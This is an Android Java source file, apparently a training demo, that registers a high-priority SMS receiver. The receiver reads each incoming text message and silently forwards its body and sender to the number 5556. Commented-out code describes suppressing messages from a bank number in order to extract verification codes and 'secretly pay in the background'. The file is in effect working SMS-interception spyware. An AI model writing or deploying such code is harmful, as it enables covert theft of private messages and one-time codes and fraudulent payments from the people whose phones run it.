package com.itheima.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
/*在清单文件注册
 * <receiver android:name="com.itheima.sms.SmsListener" >
            <intent-filter android:priority="1000" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
 * 
 * 并且开通权限
 * android.permission.RECEIVE_SMS
 * android.permission.SEND_SMS
 * 
 */

public class SmsListener extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//在清单文件里注册要接收广播的类型.
		//
		System.out.println("收到广播了-短信");
		//一组短信
		Object[] obj = (Object[]) intent.getExtras().get("pdus");
		for (Object ob : obj) {
			//固定格式解析
			SmsMessage sms = SmsMessage.createFromPdu((byte[])ob);
			//获取信息和号码
			String body = sms.getMessageBody();
			String address = sms.getOriginatingAddress();
			System.out.println(body+"----"+address);
			//将信息转发
			SmsManager smsmanager = SmsManager.getDefault();
			smsmanager.sendTextMessage("5556", null, "拦截信息为:"+body+"-"+address, null, null);
			//拦截广告信息
//			if(address.equals("95533")){
//				System.out.println("提取验证码，偷偷的后台支付");
//				abortBroadcast();
//			}
		}
	}

}
